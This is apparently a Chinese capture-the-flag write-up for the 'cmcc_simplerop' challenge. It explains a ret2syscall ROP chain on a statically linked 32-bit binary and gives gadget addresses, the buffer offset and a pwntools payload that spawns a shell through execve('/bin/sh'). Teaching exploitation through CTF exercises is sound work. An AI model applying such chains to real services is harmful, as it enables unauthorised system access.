+++
title = "ret2syscall"
date = "2026-04-21"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
### cmcc_simplerop解题ROP链原理及作用分析

在`cmcc_simplerop`题目中，ROP链的核心原理是利用**静态编译特性**和**ret2syscall技术**直接触发系统调用获取shell。以下是详细解析：

#### ROP链原理
1. **静态编译优势**：
   - 程序静态编译包含所有库函数代码（如syscall指令、pop指令等）
   - 无需泄露libc地址，可直接在二进制中搜索所需gadget
   - 存在现成的`/bin/sh`字符串（地址`0x080BE408`）

2. **ret2syscall技术**：
   - 通过ROP链设置寄存器直接触发`int 0x80`系统调用
   - 32位系统调用约定：
     ```
     eax = 系统调用号（execve为0xb）
     ebx = 参数字符串地址（/bin/sh）
     ecx = 参数数组地址
     edx = 环境变量地址（可设为0）
     ```

#### ROP链构造步骤
```python
from pwn import *

# Gadget地址（通过ROPgadget获取）
pop_eax = 0x080bae06       # pop eax; ret
pop_edx_ecx_ebx = 0x0806ecda  # pop edx; pop ecx; pop ebx; ret
int_0x80 = 0x080493e1      # int 0x80; ret
bin_sh = 0x080BE408        # "/bin/sh"字符串地址

offset = 44  # 缓冲区到返回地址的偏移

payload = flat(
    b'A' * offset,        # 填充缓冲区
    pop_eax,              # 设置eax
    0xb,                  # execve系统调用号
    pop_edx_ecx_ebx,      # 设置其他寄存器
    0,                    # edx=0 (环境变量)
    0,                    # ecx=0 (参数数组)
    bin_sh,               # ebx=/bin/sh地址
    int_0x80              # 触发系统调用
)
```


#### 关键gadget作用
| Gadget指令             | 地址       | 作用                          |
|-----------------------|-----------|-----------------------------|
| `pop eax; ret`        | 0x080bae06 | 设置系统调用号到eax寄存器          |
| `pop edx; pop ecx; pop ebx; ret` | 0x0806ecda | 一次性设置三个寄存器               |
| `int 0x80; ret`       | 0x080493e1 | 触发系统调用执行execve("/bin/sh") |

#### 栈布局示意图
```
+------------------+
|    填充数据(44字节) | 
+------------------+
|   pop_eax地址     | ← 覆盖返回地址
+------------------+
|     0xb (eax)    |
+------------------+
| pop_edx_ecx_ebx  | 
+------------------+
|       0 (edx)    |
+------------------+
|       0 (ecx)    |
+------------------+
|   bin_sh (ebx)   | 
+------------------+
|   int_0x80地址    | 
+------------------+
```

#### 为何选择ret2syscall
1. **效率优势**：
   - 只需5个gadget即可完成系统调用
   - 比传统ret2libc少一次函数调用
   
2. **静态编译特性**：
   - 所有syscall指令已包含在二进制中
   - 无需动态解析libc地址

3. **防御绕过**：
   - 直接使用程序自身的gadget
   - 不受ASLR影响（.text段无随机化）

#### 实际效果
执行该ROP链后：
1. 触发`execve("/bin/sh", NULL, NULL)`系统调用
2. 启动shell获得系统控制权
3. 可执行任意命令（如`cat flag`）
